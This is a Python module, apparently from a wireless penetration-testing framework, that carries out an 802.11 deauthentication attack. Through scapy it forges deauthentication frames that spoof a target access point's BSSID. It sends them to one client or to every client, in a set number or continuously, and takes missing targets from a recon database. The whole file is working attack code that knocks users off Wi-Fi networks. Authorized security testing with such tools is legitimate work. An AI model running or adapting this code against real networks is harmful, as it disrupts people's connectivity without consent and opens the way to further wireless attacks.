import signal
from time import sleep

from pony.orm import *
from pyric import pyw
from scapy.all import sendp
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

from pinecone.core.module import BaseModule
from pinecone.utils.interface import set_monitor_mode, check_chset
from pinecone.utils.packet import BROADCAST_MAC, compare_macs
from pinecone.core.options import OptionDict, Option


class Module(BaseModule):
    META = {
        "id": "attack/deauth",
        "name": "802.11 deauthentication attack module",
        "author": "Valentín Blanco (https://github.com/valenbg1)",
        "version": "1.0.0",
        "description": "Deauthenticates clients from APs forging 802.11 deauthentication frames. If some required "
                       "options for the attack (such as --bssid or --channel) are omitted, they are obtained, when "
                       "possible, from the recon db (use the module discovery/recon to populate it).",
        "options": OptionDict(),
        "depends": {}
    }
    META["options"].add(Option("INTERFACE", "wlan0", True, "monitor mode capable WLAN interface"))
    META["options"].add(Option("BSSID", description="BSSID of target AP"))
    META["options"].add(Option("SSID", description="SSID of target AP"))
    META["options"].add(Option("CHANNEL", description="channel of target AP, if 0 or negative the WLAN interface "
                                                      "(option --iface) current channel will be used.", opt_type=int))
    META["options"].add(Option("CLIENT", BROADCAST_MAC, description="MAC of target client."))
    META["options"].add(Option("NUM_FRAMES", 1, description="number of deauth frames to send (multiplied by 64), if 0 "
                                                            "or negative frames will be sent continuously until ctrl-c "
                                                            "is pressed.", opt_type=int))

    def __init__(self):
        self.inf_running = False
        self.cmd = None

    def sig_int_handler(self, signal, frame):
        self.inf_running = False
        self.cmd.pfeedback("\n[i] Exiting...\n")

    def run(self, opts, cmd):
        self.cmd = cmd
        opts = opts.get_opts_namespace()

        with db_session:
            bss = cmd.select_bss(opts.ssid, opts.bssid, opts.client)

            if bss:
                if not opts.bssid:
                    opts.bssid = bss.bssid

                if opts.channel is None:
                    opts.channel = bss.channel

        if opts.bssid is None:
            cmd.perror("BSSID is missing, and couldn't be obtained from the recon db.")
        elif opts.channel is None:
            cmd.perror("Channel is missing, and couldn't be obtained from the recon db.")
        else:
            interface = set_monitor_mode(opts.interface)

            if opts.channel > 0:
                check_chset(interface, opts.channel)
            else:
                opts.channel = pyw.chget(interface)

            deauth_frame = RadioTap() / Dot11(addr1=opts.client, addr2=opts.bssid, addr3=opts.bssid) / Dot11Deauth(
                reason="class3-from-nonass")
            opts.num_frames = "infinite" if opts.num_frames <= 0 else opts.num_frames * 64

            if compare_macs(opts.client, BROADCAST_MAC):
                cmd.pfeedback(
                    "[i] Sending {} deauth frames to all clients from AP {} on channel {}...".format(opts.num_frames,
                                                                                                     opts.bssid,
                                                                                                     opts.channel))
            else:
                cmd.pfeedback(
                    "[i] Sending {} deauth frames to client {} from AP {} on channel {}...".format(opts.num_frames,
                                                                                                   opts.client,
                                                                                                   opts.bssid,
                                                                                                   opts.channel))

            if opts.num_frames == "infinite":
                self.inf_running = True
                prev_sig_handler = signal.signal(signal.SIGINT, self.sig_int_handler)

                cmd.pfeedback("[i] Press ctrl-c to stop.")

                while self.inf_running:
                    try:
                        sendp(deauth_frame, iface=opts.interface, count=64, inter=0.002)
                    except:
                        pass

                    sleep(0.5)

                signal.signal(signal.SIGINT, prev_sig_handler)
            else:
                sendp(deauth_frame, iface=opts.interface, count=opts.num_frames, inter=0.002)

    def stop(self, cmd):
        pass
